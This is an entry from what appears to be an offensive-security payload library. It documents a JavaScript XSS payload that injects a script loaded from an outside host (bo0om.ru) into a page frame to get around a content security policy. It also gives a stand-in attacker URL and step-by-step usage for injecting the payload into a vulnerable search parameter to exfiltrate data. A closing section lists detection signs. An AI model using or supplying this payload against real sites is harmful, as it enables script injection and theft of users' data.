---
type: code
language: javascript
verified: true
tags:
  - xss
  - csp-bypass
  - payload
platforms:
  - web
validated: true
---

# javascript-dynamic-script-injection

## Code

```javascript
script=document.createElement('script');
script.src='//bo0om.ru/csp.js';
window.frames[0].document.head.appendChild(script);
```

## Description

This JavaScript code dynamically creates a new <script> element, sets its source to an external URL, and appends it to the head of the first frame in the document. It allows loading and executing external scripts in the context of the target page, bypassing some CSP restrictions if 'unsafe-inline' is permitted for inline script creation.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| script.src | URL of the external script to load (replace with attacker's controlled script) | '//attacker.com/malicious.js' |

## Usage

Inject this code as an XSS payload into a vulnerable parameter or input field on the target site (e.g., ?search=<script>code here</script>). It executes in the browser, loading the external script to perform actions like data exfiltration or further exploitation. Use in scenarios where the CSP allows unsafe-inline but blocks direct external script tags.

## Detection

- Monitor for dynamic DOM manipulations creating script elements (e.g., via browser dev tools or CSP violation reports).
- Network logs showing unexpected requests to external domains like bo0om.ru or attacker-controlled hosts.
- JavaScript execution logs or anomaly detection in web application firewalls (WAFs) for createElement('script').

## Related

- [[procedures/CSP-Bypass-via-Unsafe-Inline-Script-Injection]]
